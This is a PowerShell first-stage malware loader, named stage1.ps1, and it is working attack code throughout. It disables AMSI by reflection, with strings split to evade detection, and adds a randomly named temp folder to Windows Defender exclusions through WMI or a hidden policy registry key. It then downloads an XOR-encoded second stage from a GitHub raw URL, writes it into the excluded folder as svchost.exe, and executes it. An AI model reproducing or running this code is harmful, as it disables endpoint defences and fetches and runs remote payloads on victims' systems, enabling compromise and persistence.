# stage1.ps1 — AMSI patch + Defender exclusion + stage2 drop

# ---------- 1. AMSI patch ----------
try {
    $t = [Ref].Assembly.GetType(('System.Management.Automation.' + 'AmsiUtils'))
    $f = $t.GetField(('amsi' + 'InitFailed'), 'NonPublic,Static')
    $f.SetValue($null, $true)
} catch {}

# ---------- 2. Defender exclusion via WMI CIM (no PowerShell child) ----------
$excludeDir = "$env:TEMP\WinCache_" + [System.IO.Path]::GetRandomFileName().Substring(0,8)
New-Item -ItemType Directory -Path $excludeDir -Force | Out-Null

try {
    $mp = Get-CimInstance -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -ErrorAction Stop
    $mp | Invoke-CimMethod -MethodName Add -Arguments @{
        ExclusionPath = @($excludeDir)
    } -ErrorAction Stop | Out-Null
} catch {
    # fallback: Group Policy registry key (survives reboot, hidden from normal checks)
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    New-ItemProperty -Path $regPath -Name $excludeDir -Value 0 -PropertyType DWord -Force | Out-Null
}

# ---------- 3. Download stage2 into the excluded folder ----------
$url = "https://raw.githubusercontent.com/beamer123q-svg/update-test/main/stage2.bin"
$key = [byte[]](0x5A,0x5B,0x5C,0x5D)

try {
    $bytes = (New-Object Net.WebClient).DownloadData($url)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
    }
    $stage2Path = Join-Path $excludeDir "svchost.exe"
    [System.IO.File]::WriteAllBytes($stage2Path, $bytes)
    Start-Process -FilePath $stage2Path
} catch {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show("STAGE1 FAILED: $_", "Test")
}
